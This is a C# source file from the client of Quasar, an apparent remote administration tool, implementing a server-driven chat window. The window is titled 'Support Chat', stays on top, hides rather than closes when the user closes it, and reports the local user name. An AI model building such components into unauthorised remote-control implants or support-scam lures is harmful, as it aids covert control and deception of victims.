using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
    /// <summary>
    /// Handles chat messages from the server and provides a bidirectional chat window on the client.
    /// </summary>
    public class ChatHandler : IMessageProcessor
    {
        /// <summary>
        /// The chat form displayed on the client machine.
        /// </summary>
        private FrmChat _chatForm;

        /// <summary>
        /// The sender (server connection) to reply back on.
        /// </summary>
        private ISender _sender;

        /// <summary>
        /// Lock object for thread-safe access to the chat form.
        /// </summary>
        private readonly object _lock = new object();

        public bool CanExecute(IMessage message) => message is DoChat;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoChat msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender sender, DoChat message)
        {
            _sender = sender;

            lock (_lock)
            {
                if (_chatForm == null || _chatForm.IsDisposed)
                {
                    // Create form on a new STA thread so it has its own message loop
                    var formReady = new ManualResetEventSlim(false);
                    new Thread(() =>
                    {
                        _chatForm = new FrmChat();
                        _chatForm.MessageSent += OnClientMessageSent;
                        _chatForm.FormClosed += (s, e) => { };
                        formReady.Set();
                        Application.Run(_chatForm);
                    }) { IsBackground = true, Name = "ChatFormThread" }.Start();
                    formReady.Wait(5000);
                }

                _chatForm.AppendMessage(message.SenderName ?? "Server", message.Message);
            }
        }

        /// <summary>
        /// Called when the client user sends a message from the chat form.
        /// </summary>
        private void OnClientMessageSent(object sender, string message)
        {
            _sender?.Send(new DoChatResponse
            {
                Message = message,
                SenderName = Environment.UserName
            });
        }

        /// <summary>
        /// The chat form displayed on the client desktop.
        /// </summary>
        private class FrmChat : Form
        {
            private readonly RichTextBox _txtChat;
            private readonly TextBox _txtInput;
            private readonly Button _btnSend;

            /// <summary>
            /// Raised when the client user sends a chat message.
            /// </summary>
            public event EventHandler<string> MessageSent;

            public FrmChat()
            {
                Text = "Support Chat";
                Size = new Size(420, 350);
                MinimumSize = new Size(350, 280);
                StartPosition = FormStartPosition.CenterScreen;
                FormBorderStyle = FormBorderStyle.Sizable;
                TopMost = true;
                ShowInTaskbar = true;
                Icon = SystemIcons.Information;

                _txtChat = new RichTextBox
                {
                    ReadOnly = true,
                    BackColor = Color.White,
                    Dock = DockStyle.Fill,
                    Font = new Font("Segoe UI", 9F),
                    ScrollBars = RichTextBoxScrollBars.Vertical
                };

                _txtInput = new TextBox
                {
                    Dock = DockStyle.Fill,
                    Font = new Font("Segoe UI", 9F)
                };
                _txtInput.KeyDown += (s, e) =>
                {
                    if (e.KeyCode == Keys.Enter && !e.Shift)
                    {
                        e.SuppressKeyPress = true;
                        SendMessage();
                    }
                };

                _btnSend = new Button
                {
                    Text = "Send",
                    Dock = DockStyle.Right,
                    Width = 70,
                    Font = new Font("Segoe UI", 9F)
                };
                _btnSend.Click += (s, e) => SendMessage();

                var bottomPanel = new Panel
                {
                    Dock = DockStyle.Bottom,
                    Height = 32,
                    Padding = new Padding(2)
                };
                bottomPanel.Controls.Add(_txtInput);
                bottomPanel.Controls.Add(_btnSend);

                Controls.Add(_txtChat);
                Controls.Add(bottomPanel);
            }

            private void SendMessage()
            {
                string text = _txtInput.Text.Trim();
                if (string.IsNullOrEmpty(text))
                    return;

                AppendMessage("Me", text);
                _txtInput.Clear();
                _txtInput.Focus();
                MessageSent?.Invoke(this, text);
            }

            /// <summary>
            /// Appends a message to the chat log. Thread-safe.
            /// </summary>
            public void AppendMessage(string sender, string message)
            {
                if (InvokeRequired)
                {
                    Invoke((MethodInvoker)(() => AppendMessage(sender, message)));
                    return;
                }

                if (!Visible)
                {
                    Show();
                    BringToFront();
                }

                _txtChat.SelectionStart = _txtChat.TextLength;
                _txtChat.SelectionLength = 0;

                // Sender name in bold
                _txtChat.SelectionFont = new Font(_txtChat.Font, FontStyle.Bold);
                _txtChat.SelectionColor = sender == "Me" ? Color.Blue : Color.DarkGreen;
                _txtChat.AppendText(sender + ": ");

                // Message text in normal
                _txtChat.SelectionFont = new Font(_txtChat.Font, FontStyle.Regular);
                _txtChat.SelectionColor = Color.Black;
                _txtChat.AppendText(message + Environment.NewLine);

                _txtChat.ScrollToCaret();
            }

            protected override void OnFormClosing(FormClosingEventArgs e)
            {
                // Hide instead of close so it can be reused
                if (e.CloseReason == CloseReason.UserClosing)
                {
                    e.Cancel = true;
                    Hide();
                    return;
                }
                base.OnFormClosing(e);
            }
        }
    }
}
